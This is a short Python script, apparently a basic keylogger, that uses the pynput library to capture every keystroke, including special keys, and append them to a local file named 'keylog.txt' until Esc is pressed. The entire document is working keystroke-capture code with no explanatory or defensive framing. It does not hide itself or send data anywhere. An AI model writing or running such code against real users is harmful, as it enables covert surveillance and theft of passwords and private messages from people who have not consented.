from pynput import keyboard


log_file = "keylog.txt"


def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(' ')
            elif key == keyboard.Key.enter:
                file.write('\n')
            else:
                file.write(f'[{key.name}]')


def on_release(key):
    if key == keyboard.Key.esc:  
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
